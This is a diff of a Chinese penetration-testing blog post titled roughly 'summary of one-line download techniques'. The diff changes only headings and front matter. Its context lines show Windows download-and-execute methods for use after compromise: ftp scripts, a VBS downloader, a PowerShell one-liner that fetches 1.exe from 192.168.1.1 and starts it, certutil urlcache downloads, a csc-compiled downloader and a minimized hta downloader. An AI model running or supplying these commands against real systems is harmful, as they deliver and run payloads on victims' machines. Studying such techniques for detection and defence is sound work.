@@ -1,18 +1,16 @@
 ---
 title: "一句话下载姿势总结"
 date: 2019-05-23T14:11:16+08:00
-lastmod: 2019-05-23T14:11:16+08:00
 draft: false
 tags: ['shell','download']
 categories: ['渗透测试']
-comment: true
 ---
 
 在上一篇文章中，提到了下载shell的一些姿势，我们这篇文章来深入探究下。
 
 <!--more-->
 
-# ftp
+## ftp
 
 ```bash
 echo open 192.168.1.1 21> ftp.txt
@@ -25,7 +23,7 @@ ftp -s:ftp.txt
 
 需要搭建ftp服务器，初次使用ftp下载防火墙会弹框拦截，使用前记得要先添加防火墙规则
 
-# vbs
+## vbs
 
 vbs downloader,使用msxml2.xmlhttp和adodb.stream对象
 
@@ -42,13 +40,13 @@ aGet.Write(Post.responseBody)
 aGet.SaveToFile "C:\test\1.exe",2
 ```
 
-# powershell
+## powershell
 
 ```powershell
 powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','C:\test\1.exe');start-process 'C:\test\1.exe'
 ```
 
-# certutil
+## certutil
 
 保存在当前路径，文件名称同URL
 
@@ -76,7 +74,7 @@ certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete
 certutil.exe -urlcache *
 ```
 
-# csc
+## csc
 
 csc.exe是微软.NET Framework 中的C#编译器，Windows系统中默认包含，可在命令行下将cs文件编译成exe
 
@@ -105,7 +103,7 @@ C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:C:\tes
 t\download.exe C:\test\download.cs
 ```
 
-# hta
+## hta
 
 添加最小化和自动退出hta程序的功能，执行过程中会最小化hta窗口，下载文件结束后自动退出hta程序
 
@@ -137,7 +135,7 @@ WINDOWSTATE = "minimize">
 </html>
 ```
 
-# bitsadmin
+## bitsadmin
 
 bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带
 
